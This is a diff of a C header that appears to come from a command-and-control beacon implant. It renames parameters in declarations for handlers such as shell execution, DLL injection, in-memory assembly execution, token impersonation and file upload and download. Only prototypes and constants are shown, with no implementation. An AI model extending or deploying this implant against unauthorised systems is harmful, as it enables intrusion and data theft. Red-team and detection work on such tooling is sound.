@@ -16,37 +16,37 @@
 #include "Api.h"
 #include "CallbackType.h"
 
-// Beacon command handlers
-VOID CmdChangSleepTimes(unsigned char* command, size_t command_length);
-VOID CmdPs(unsigned char* command, size_t command_length);
-VOID CmdInlineExecute(unsigned char* command, size_t command_length);
-unsigned char* CmdFileBrowse(unsigned char* command, size_t command_length, size_t* msgLen);
-unsigned char* CmdUpload(unsigned char* command, size_t command_length, size_t* msgLen, unsigned char* mode);
-unsigned char* CmdDrives(unsigned char* command, size_t command_length, size_t* msgLen);
-unsigned char* CmdMkdir(unsigned char* command, size_t command_length, size_t* msgLen);
-unsigned char* CmdFileRemove(unsigned char* command, size_t command_length, size_t* msgLen);
-unsigned char* CmdFileCopy(unsigned char* command, size_t commandlen, size_t* msgLen);
-unsigned char* CmdFileMove(unsigned char* command, size_t command_length, size_t* msgLen);
-unsigned char* CmdSetEnv(unsigned char* command, size_t command_length, size_t* msgLen);
-VOID CmdFileDownload(unsigned char* command, size_t command_length, size_t* msgLen);
-VOID CmdShell(unsigned char* command, size_t command_length);
-VOID CmdDllInject(unsigned char* command, size_t command_length, BOOL x86);
-VOID CmdExecuteAssembly(unsigned char* command, size_t command_length);
-unsigned char* CmdPwd(size_t* msgLen);
-unsigned char* CmdGetUid(size_t* msgLen);
-unsigned char* CmdCd(unsigned char* command, size_t command_length, size_t* msgLen);
-unsigned char* CmdGetPrivs(size_t* msgLength);
-unsigned char* CmdJobList(size_t* msgLen);
-unsigned char* CmdJobKill(unsigned char* command, size_t command_length, size_t* msgLength);
-VOID CmdSpawn(unsigned char* command, size_t command_length, BOOL x86, BOOL ignoreToken);
-VOID CmdJobRegister(unsigned char* command, size_t command_length, BOOL impersonate, BOOL isMsgMode);
+// beacon command handlers
+VOID CmdChangSleepTimes(unsigned char* command_buffer, size_t command_length);
+VOID CmdPs(unsigned char* command_buffer, size_t command_length);
+VOID CmdInlineExecute(unsigned char* command_buffer, size_t command_length);
+unsigned char* CmdFileBrowse(unsigned char* command_buffer, size_t command_length, size_t* post_length);
+unsigned char* CmdUpload(unsigned char* command_buffer, size_t command_length, size_t* post_length, unsigned char* mode);
+unsigned char* CmdDrives(unsigned char* command_buffer, size_t command_length, size_t* post_length);
+unsigned char* CmdMkdir(unsigned char* command_buffer, size_t command_length, size_t* post_length);
+unsigned char* CmdFileRemove(unsigned char* command_buffer, size_t command_length, size_t* post_length);
+unsigned char* CmdFileCopy(unsigned char* command_buffer, size_t commandlen, size_t* post_length);
+unsigned char* CmdFileMove(unsigned char* command_buffer, size_t command_length, size_t* post_length);
+unsigned char* CmdSetEnv(unsigned char* command_buffer, size_t command_length, size_t* post_length);
+VOID CmdFileDownload(unsigned char* command_buffer, size_t command_length, size_t* post_length);
+VOID CmdShell(unsigned char* command_buffer, size_t command_length);
+VOID CmdDllInject(unsigned char* command_buffer, size_t command_length, BOOL x86);
+VOID CmdExecuteAssembly(unsigned char* command_buffer, size_t command_length);
+unsigned char* CmdPwd(size_t* post_length);
+unsigned char* CmdGetUid(size_t* post_length);
+unsigned char* CmdCd(unsigned char* command_buffer, size_t command_length, size_t* post_length);
+unsigned char* CmdGetPrivs(size_t* post_length);
+unsigned char* CmdJobList(size_t* post_length);
+unsigned char* CmdJobKill(unsigned char* command_buffer, size_t command_length, size_t* post_length);
+VOID CmdSpawn(unsigned char* command_buffer, size_t command_length, BOOL x86, BOOL ignoreToken);
+VOID CmdJobRegister(unsigned char* command_buffer, size_t command_length, BOOL impersonate, BOOL isMsgMode);
 
-// Utility functions
 wchar_t* makeMetaData();
-unsigned char* MakePacket(int callback, unsigned char* postMsg, size_t msgLen, size_t* buflen);
-VOID DataProcess(unsigned char* postMsg, size_t msgLen, int callbackType);
+unsigned char* MakePacket(int callback, unsigned char* post_buffer, size_t post_length, size_t* packet_length);
+VOID DataProcess(unsigned char* post_buffer, size_t post_length, int callbackType);
 
 // command_type
+#define CMD_TYPE_NULL                        -1
 #define CMD_TYPE_SPAWN_X86                   1
 #define CMD_TYPE_EXIT                        3
 #define CMD_TYPE_SLEEP                       4
